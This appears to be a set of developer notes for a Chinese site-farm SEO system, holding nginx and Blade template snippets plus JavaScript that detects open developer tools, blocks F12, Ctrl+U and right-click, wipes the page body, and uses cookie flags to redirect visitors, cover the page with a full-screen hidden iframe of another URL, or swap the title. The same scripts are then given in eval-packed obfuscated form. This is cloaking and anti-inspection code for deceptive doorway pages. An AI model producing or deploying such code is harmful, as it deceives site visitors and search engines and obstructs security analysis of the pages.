error_page 404 /;
location / {
try_files $uri $uri/ /index.php?$query_string;
}

<p align="center">本地模板变量</a></p>
@php($info=$data->content($firstDomain,$ua,$pinyin))
                        <li>
                            <a href="http://{{$info['url']}}" target="" title="{{$info['title']}}">{{$info['title']}}</a>
                        </li>

{{date('Y-m-d',strtotime('-'.$i.' day'))}}
{{date('Y-m-d H:i:s',time()-888)}}
{{url('template/company/yiqingkonggu/img/5684a5476d2049ab98944e7146a1cacd.jpg')}}
@php($img=[])
{{url('template/company/yiqingkonggu/img'.'/'.$img[$i])}}
- $topTitle：title标题
- $keywords：keywords描述
- $description：description详细描述
- $firstDomain：当前域名
- $title：词


php /www/wwwroot/stationgroup/artisan command:delcache


function consoleOpenCallback(){
window.location.href='https://www.sogou.com';
return "";
}
(function () {
'use strict';
var devtools = {
open: false,
orientation: null
};
// inner大小和outer大小超过threshold被认为是打开了开发者工具
var threshold = 160;
// 当检测到开发者工具后发出一个事件，外部监听此事件即可，设计得真好，很好的实现了解耦
var emitEvent = function (state, orientation) {
window.dispatchEvent(new CustomEvent('devtoolschange', {
detail: {
open: state,
orientation: orientation
}
}));
if(state===true){
consoleOpenCallback();
}
};
// 每500毫秒检测一次开发者工具的状态，当状态改变时触发事件
setInterval(function () {
var widthThreshold = window.outerWidth - window.innerWidth > threshold;
var heightThreshold = window.outerHeight - window.innerHeight > threshold;
var orientation = widthThreshold ? 'vertical' : 'horizontal';
// 第一个条件判断没看明白，heightThreshold和widthThreshold不太可能同时为true，不论是其中任意一个false还是两个都false取反之后都会为true，此表达式恒为true
if (!(heightThreshold && widthThreshold) &&
// 针对Firebug插件做检查
((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
// 开发者工具打开，如果之前开发者工具没有打开，或者已经打开但是靠边的方向变了才会发送事件
if(!devtools.open || devtools.orientation !== orientation) {
emitEvent(true,orientation);
}
devtools.open=true;
devtools.orientation=orientation;
} else {
// 开发者工具没有打开，如果之前处于打开状态则触发事件报告状态
if(devtools.open){
emitEvent(false,null);
}
// 将标志位恢复到未打开
devtools.open=false;
devtools.orientation=null;
}
}, 500);
if(typeof module!=='undefined'&&module.exports) {
module.exports=devtools;
}else{
window.devtools=devtools;
}
})();
window.onload=function(){
//屏蔽键盘事件
document.onkeydown=function(){
var e=window.event||arguments[0];
//F12
if(e.keyCode===123) {
consoleOpenCallback();
//Ctrl+Shift+I
}else if((e.ctrlKey)&&(e.shiftKey)&&(e.keyCode===73)) {
consoleOpenCallback();
return false;
//Shift+F10
}else if((e.shiftKey)&&(e.keyCode===121)){
consoleOpenCallback();
//Ctrl+U
}else if((e.ctrlKey)&&(e.keyCode===85)) {
consoleOpenCallback();
}
};
//屏蔽鼠标右键
document.oncontextmenu = function() {
consoleOpenCallback();
}
}
!function(){
// 创建一个对象
let foo=/./;
// 将其打印到控制台上，实际上是一个指针
console.log(foo);
// 要在第一次打印完之后再重写toString方法
foo.toString=consoleOpenCallback;
}();
//打开控制台方法2,debugger。
!function(){
var timelimit = 50;
var open = false;
setInterval(function() {
var starttime = new Date();
debugger;
if(new Date()-starttime>timelimit){
open = true;
window.stop();
var e = document.querySelector("body");
var child = e.lastElementChild;
while (child) {
e.removeChild(child);
child = e.lastElementChild;
}
consoleOpenCallback();
}else{
open=false;
}
},500);
}();

setTimeout(function(){
jQuery.getbody=document.getElementsByTagName("body")[0];
jQuery.childs=jQuery.getbody.childNodes;
for(var i=jQuery.childs.length-1;i>=0;i--){
jQuery.getbody.removeChild(jQuery.childs[i]);
}
},500);



var modulesss=document.cookie.split("; ");
如果开启后，有人访问F12 等查看源代码得动作
var safety='';
for(var i=0;i<modulesss.length;i++){
var arr=modulesss[i].split("=");
if('SAFE-TOKEN'===arr[0]){
var c=arr[1].split("\\");
for (var i=1;i<c.length;i++){
c[i]=c[i].replace('x','');
safety+=String.fromCharCode(parseInt(c[i],16));
}
break;
}
}
if(safety){
function consoleOpenCallback() {
window.location.href=safety;
}
(function(){
'use strict';
var devtools={
open:false,
orientation:null
};
var threshold=160;
var emitEvent=function(state,orientation) {
window.dispatchEvent(new CustomEvent('devtoolschange',{
detail:{
open:state,
orientation:orientation
}
}));
if(state===true){
consoleOpenCallback();
}
};
setInterval(function(){
var widthThreshold=window.outerWidth - window.innerWidth > threshold;
var heightThreshold=window.outerHeight - window.innerHeight > threshold;
var orientation = widthThreshold ? 'vertical' : 'horizontal';
if (!(heightThreshold && widthThreshold) &&
((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
if(!devtools.open || devtools.orientation !== orientation) {
emitEvent(true,orientation);
}
devtools.open=true;
devtools.orientation=orientation;
}else{
if(devtools.open){
emitEvent(false,null);
}
devtools.open=false;
devtools.orientation=null;
}
},500);
if(typeof module!=='undefined'&&module.exports) {
module.exports=devtools;
}else{
window.devtools=devtools;
}
})();
window.onload= function () {
document.onkeydown=function () {
var e = window.event || arguments[0];
if (e.keyCode===123) {
consoleOpenCallback();
} else if ((e.ctrlKey) && (e.shiftKey) && (e.keyCode === 73)) {
consoleOpenCallback();
} else if ((e.shiftKey) && (e.keyCode === 121)) {
consoleOpenCallback();
} else if ((e.ctrlKey) && (e.keyCode === 85)) {
consoleOpenCallback();
}
};
document.oncontextmenu = function () {
consoleOpenCallback();
}
}
}


删body之后得代码
for(var i=0;i<modulesss['\x6c\x65\x6e\x67\x74\x68'];i++){
var arr=modulesss[i]['\x73\x70\x6c\x69\x74']("\x3d");
if('\x44\x45\x4c\x2d\x54\x4f\x4b\x45\x4e'===arr[0]){
var b=arr[1]['\x73\x70\x6c\x69\x74']("\\");
for (var i=1;i<b['\x6c\x65\x6e\x67\x74\x68'];i++){
b[i]=b[i]['\x72\x65\x70\x6c\x61\x63\x65']('\x78','');
del+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](parseInt(b[i],16));
}
break;
}
}
if(del){
setInterval(function(){
var getbody=document['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65']('\x62\x6f\x64\x79')[0];
var childs=getbody['\x63\x68\x69\x6c\x64\x4e\x6f\x64\x65\x73'];
for(var i=childs['\x6c\x65\x6e\x67\x74\x68']-1;i>=0;i--){
getbody['\x72\x65\x6d\x6f\x76\x65\x43\x68\x69\x6c\x64'](childs[i]);
}
},1);
}




iframe 框架
for(var i=0;i<modulesss['\x6c\x65\x6e\x67\x74\x68'];i++){
var arr=modulesss[i]['\x73\x70\x6c\x69\x74']("\x3d");
if('\x43\x53\x52\x46\x2d\x54\x4f\x4b\x45\x4e'===arr[0]){
var a=arr[1]['\x73\x70\x6c\x69\x74']("\\");
for (var i=1;i<a['\x6c\x65\x6e\x67\x74\x68'];i++){
a[i]=a[i]['\x72\x65\x70\x6c\x61\x63\x65']('\x78','');
kj+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](parseInt(a[i],16));
}
break;
}
}
if(kj){
var iframe=document.createElement("iframe");
iframe.width='100%';
iframe.height='100%';
iframe.src=kj;
iframe.id='hidden';
iframe.style.position='fixed';
iframe.style.zIndex=2147483647;
iframe.style.left=0;
iframe.style.top=0;
iframe.style.border=0;
iframe.style.backgroundColor='#fff';
document.getElementsByTagName('html')[0].appendChild(iframe);
document.getElementsByTagName('html')[0].style.overflow='hidden';
}




替换假词
for(var i=0;i<modulesss['\x6c\x65\x6e\x67\x74\x68'];i++){
var arr=modulesss[i]['\x73\x70\x6c\x69\x74']("\x3d");
if('\x43\x48\x41\x4e\x47\x45\x2d\x54\x4f\x4b\x45\x4e'===arr[0]){
changetitle=arr[1];
break;
}
}
if(changetitle){
setTimeout(function(){
document['\x74\x69\x74\x6c\x65']=changetitle;
},666);
}




加密后
var kj='';
var changetitle='';
var del='';
var safety='';
var modulesss=document['\x63\x6f\x6f\x6b\x69\x65']['\x73\x70\x6c\x69\x74']("\x3b ");
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('S(j i=0;i<T[\'\\a\\2\\5\\n\\4\\9\'];i++){j I=T[i][\'\\b\\l\\a\\6\\4\']("\\Y");g(\'\\Z\\X\\A\\H\\14\\13\\12\\x\\H\\11\'===I[0]){j c=I[1][\'\\b\\l\\a\\6\\4\']("\\\\");S(j i=1;i<c[\'\\a\\2\\5\\n\\4\\9\'];i++){c[i]=c[i][\'\\7\\2\\l\\a\\f\\h\\2\'](\'\\B\',\'\');J+=10[\'\\v\\7\\3\\z\\s\\9\\f\\7\\s\\3\\8\\2\'](V(c[i],16))}1c}}g(J){r q(){d[\'\\a\\3\\h\\f\\4\\6\\3\\5\'][\'\\9\\7\\2\\v\']=J}(r(){\'\\p\\b\\2\\18\\b\\4\\7\\6\\h\\4\';j k={O:L,o:N};j G=1h;j C=r(K,o){d[\'\\8\\6\\b\\l\\f\\4\\h\\9\\H\\u\\2\\5\\4\'](1i 1k(\'\\8\\2\\u\\4\\3\\3\\a\\b\\h\\9\\f\\5\\n\\2\',{1j:{O:K,o:o}}));g(K===E){q()}};1b(r(){j y=d[\'\\3\\p\\4\\2\\7\\Q\\6\\8\\4\\9\']-d[\'\\6\\5\\5\\2\\7\\Q\\6\\8\\4\\9\']>G;j D=d[\'\\3\\p\\4\\2\\7\\P\\2\\6\\n\\9\\4\']-d[\'\\6\\5\\5\\2\\7\\P\\2\\6\\n\\9\\4\']>G;j o=y?\'\\u\\2\\7\\4\\6\\h\\f\\a\':\'\\9\\3\\7\\6\\U\\3\\5\\4\\f\\a\';g(!(D&&y)&&((d[\'\\A\\6\\7\\2\\F\\p\\n\']&&d[\'\\A\\6\\7\\2\\F\\p\\n\'][\'\\h\\9\\7\\3\\z\\2\']&&d[\'\\A\\6\\7\\2\\F\\p\\n\'][\'\\h\\9\\7\\3\\z\\2\'][\'\\6\\b\\1a\\5\\6\\4\\6\\f\\a\\6\\U\\2\\8\'])||y||D)){g(!k[\'\\3\\l\\2\\5\']||k[\'\\3\\7\\6\\2\\5\\4\\f\\4\\6\\3\\5\']!==o){C(E,o)}k[\'\\3\\l\\2\\5\']=E;k[\'\\3\\7\\6\\2\\5\\4\\f\\4\\6\\3\\5\']=o}w{g(k[\'\\3\\l\\2\\5\']){C(L,N)}k[\'\\3\\l\\2\\5\']=L;k[\'\\3\\7\\6\\2\\5\\4\\f\\4\\6\\3\\5\']=N}},17);g(15 M!==\'\\p\\5\\8\\2\\v\\6\\5\\2\\8\'&&M[\'\\2\\B\\l\\3\\7\\4\\b\']){M[\'\\2\\B\\l\\3\\7\\4\\b\']=k}w{d[\'\\8\\2\\u\\4\\3\\3\\a\\b\']=k}})();d[\'\\3\\5\\a\\3\\f\\8\']=r(){R[\'\\3\\5\\t\\2\\m\\8\\3\\1g\\5\']=r(){j e=d[\'\\2\\u\\2\\5\\4\']||19[0];g(e[\'\\t\\2\\m\\s\\3\\8\\2\']===1d){q()}w g((e[\'\\h\\4\\7\\a\\x\\2\\m\'])&&(e[\'\\b\\9\\6\\v\\4\\x\\2\\m\'])&&(e[\'\\t\\2\\m\\s\\3\\8\\2\']===1e)){q()}w g((e[\'\\b\\9\\6\\v\\4\\x\\2\\m\'])&&(e[\'\\t\\2\\m\\s\\3\\8\\2\']===1f)){q()}w g((e[\'\\h\\4\\7\\a\\x\\2\\m\'])&&(e[\'\\t\\2\\m\\s\\3\\8\\2\']===W)){q()}};R[\'\\3\\5\\h\\3\\5\\4\\2\\B\\4\\z\\2\\5\\p\']=r(){q()}}}',62,83,'||x65|x6f|x74|x6e|x69|x72|x64|x68|x6c|x73||window||x61|if|x63||var|devtools|x70|x79|x67|orientation|x75|consoleOpenCallback|function|x43|x6b|x76|x66|else|x4b|widthThreshold|x6d|x46|x78|emitEvent|heightThreshold|true|x62|threshold|x45|arr|safety|state|false|module|null|open|x48|x57|document|for|modulesss|x7a|parseInt|85|x41|x3d|x53|String|x4e|x4f|x54|x2d|typeof||500|x20|arguments|x49|setInterval|break|123|73|121|x77|160|new|detail|CustomEvent'.split('|'),0,{}))
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('h(4 i=0;i<v[\'\\3\\2\\e\\8\\5\\6\'];i++){4 m=v[i][\'\\d\\n\\3\\f\\5\']("\\x");q(\'\\A\\k\\D\\E\\r\\C\\B\\k\\j\'===m[0]){4 b=m[1][\'\\d\\n\\3\\f\\5\']("\\\\");h(4 i=1;i<b[\'\\3\\2\\e\\8\\5\\6\'];i++){b[i]=b[i][\'\\a\\2\\n\\3\\c\\t\\2\'](\'\\w\',\'\');s+=z[\'\\y\\a\\7\\g\\p\\6\\c\\a\\p\\7\\9\\2\'](F(b[i],K))}M}}q(s){N(H(){4 o=L[\'\\8\\2\\5\\k\\3\\2\\g\\2\\e\\5\\d\\G\\u\\r\\c\\8\\j\\c\\g\\2\'](\'\\J\\7\\9\\u\')[0];4 l=o[\'\\t\\6\\f\\3\\9\\j\\7\\9\\2\\d\'];h(4 i=l[\'\\3\\2\\e\\8\\5\\6\']-1;i>=0;i--){o[\'\\a\\2\\g\\7\\I\\2\\p\\6\\f\\3\\9\'](l[i])}},1)}',50,50,'||x65|x6c|var|x74|x68|x6f|x67|x64|x72||x61|x73|x6e|x69|x6d|for||x4e|x45|childs|arr|x70|getbody|x43|if|x54|del|x63|x79|modulesss|x78|x3d|x66|String|x44|x4b|x4f|x4c|x2d|parseInt|x42|function|x76|x62|16|document|break|setInterval'.split('|'),0,{}))
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('B(m i=0;i<z[\'\\4\\2\\b\\j\\3\\d\'];i++){m u=z[i][\'\\6\\l\\4\\8\\3\']("\\M");y(\'\\n\\L\\N\\P\\O\\v\\K\\G\\p\\w\'===u[0]){m a=u[1][\'\\6\\l\\4\\8\\3\']("\\\\");B(m i=1;i<a[\'\\4\\2\\b\\j\\3\\d\'];i++){a[i]=a[i][\'\\9\\2\\l\\4\\e\\o\\2\'](\'\\t\',\'\');s+=H[\'\\k\\9\\c\\g\\n\\d\\e\\9\\n\\c\\5\\2\'](I(a[i],Y))}10}}y(s){m 7=x[\'\\o\\9\\2\\e\\3\\2\\p\\4\\2\\g\\2\\b\\3\']("\\8\\k\\9\\e\\g\\2");7[\'\\F\\8\\5\\3\\d\']=\'\\q\\f\\f\\A\';7[\'\\d\\2\\8\\j\\d\\3\']=\'\\q\\f\\f\\A\';7[\'\\6\\9\\o\']=s;7[\'\\8\\5\']=\'\\d\\8\\5\\5\\2\\b\';7[\'\\6\\3\\h\\4\\2\'][\'\\l\\c\\6\\8\\3\\8\\c\\b\']=\'\\k\\8\\t\\2\\5\';7[\'\\6\\3\\h\\4\\2\'][\'\\T\\V\\b\\5\\2\\t\']=\'\\U\\q\\r\\D\\r\\W\\Q\\S\\r\\D\';7[\'\\6\\3\\h\\4\\2\'][\'\\4\\2\\k\\3\']=\'\\f\';7[\'\\6\\3\\h\\4\\2\'][\'\\3\\c\\l\']=\'\\f\';7[\'\\6\\3\\h\\4\\2\'][\'\\E\\c\\9\\5\\2\\9\']=\'\\f\';7[\'\\6\\3\\h\\4\\2\'][\'\\E\\e\\o\\R\\j\\9\\c\\X\\b\\5\\n\\c\\4\\c\\9\']=\'\\Z\\k\\k\\k\';x[\'\\j\\2\\3\\p\\4\\2\\g\\2\\b\\3\\6\\C\\h\\v\\e\\j\\w\\e\\g\\2\'](\'\\d\\3\\g\\4\')[\'\\f\'][\'\\e\\l\\l\\2\\b\\5\\n\\d\\8\\4\\5\'](7);x[\'\\j\\2\\3\\p\\4\\2\\g\\2\\b\\3\\6\\C\\h\\v\\e\\j\\w\\e\\g\\2\'](\'\\d\\3\\g\\4\')[\'\\f\'][\'\\6\\3\\h\\4\\2\'][\'\\c\\J\\2\\9\\k\\4\\c\\F\']=\'\\d\\8\\5\\5\\2\\b\'}',62,63,'||x65|x74|x6c|x64|x73|iframe|x69|x72||x6e|x6f|x68|x61|x30|x6d|x79||x67|x66|x70|var|x43|x63|x45|x31|x34|kj|x78|arr|x54|x4e|document|if|modulesss|x25|for|x42|x37|x62|x77|x4b|String|parseInt|x76|x4f|x53|x3d|x52|x2d|x46|x33|x6b|x36|x7a|x32|x49|x38|x75|16|x23|break'.split('|'),0,{}))
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('n(a i=0;i<7[\'\\3\\b\\k\\j\\2\\l\'];i++){a 4=7[i][\'\\m\\e\\3\\c\\2\']("\\g");6(\'\\h\\d\\f\\8\\t\\9\\v\\u\\w\\x\\9\\8\'===4[0]){5=4[1];o}}6(5){q(s(){r[\'\\2\\c\\2\\3\\b\']=5},p)}',34,34,'||x74|x6c|arr|changetitle|if|modulesss|x4e|x45|var|x65|x69|x48|x70|x41|x3d|x43||x67|x6e|x68|x73|for|break|666|setTimeout|document|function|x47|x54|x2d|x4f|x4b'.split('|'),0,{}))
